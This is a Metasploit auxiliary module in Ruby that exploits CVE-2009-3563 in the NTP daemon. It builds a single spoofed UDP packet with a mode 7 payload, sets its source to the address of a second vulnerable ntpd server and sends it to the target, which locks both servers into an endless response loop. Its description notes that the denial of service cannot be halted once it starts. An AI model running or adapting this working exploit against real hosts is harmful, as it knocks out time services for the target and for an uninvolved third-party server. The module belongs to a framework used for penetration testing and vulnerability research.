##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NTP.org ntpd Reserved Mode Denial of Service',
			'Description'    => %q{
				This module exploits a denial of service vulnerability
				within the NTP (network time protocol) demon. By sending
				a single packet to a vulnerable ntpd server (Victim A),
				spoofed from the IP address of another vulnerable ntpd server
				(Victim B), both victims will enter an infinite response loop.
				Note, unless you control the spoofed source host or the real
				remote host(s), you will not be able to halt the DoS condition
				once begun!
			},
			'Author'         => [ 'todb' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '37255' ],
					[ 'CVE', '2009-3563' ],
					[ 'OSVDB', '60847' ],
					[ 'URL', 'https://support.ntp.org/bugs/show_bug.cgi?id=1331' ]
				],
			'DisclosureDate' => 'Oct 04 2009'))

			register_options(
				[
					OptAddress.new('LHOST', [true, "The spoofed address of a vulnerable ntpd server" ])
				], self.class)

			deregister_options('FILTER','PCAPFILE')

	end

	def run_host(ip)
		print_status("Sending a mode 7 packet to host #{ip} from #{datastore['LHOST']}")

		open_pcap

		n = Racket::Racket.new

		n.l3 = Racket::L3::IPv4.new
		n.l3.src_ip = datastore['LHOST']
		n.l3.dst_ip = ip
		n.l3.protocol = 17
		n.l3.id = rand(0xffff)+1
		n.l3.ttl = 255

		n.l4 = Racket::L4::UDP.new
		n.l4.src_port = 123
		n.l4.dst_port = 123
		n.l4.payload  = ["\x17","\x97\x00\x00\x00"][rand(2)]

		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)

		buff = n.pack

		capture_sendto(buff, ip)
		close_pcap
	end

end

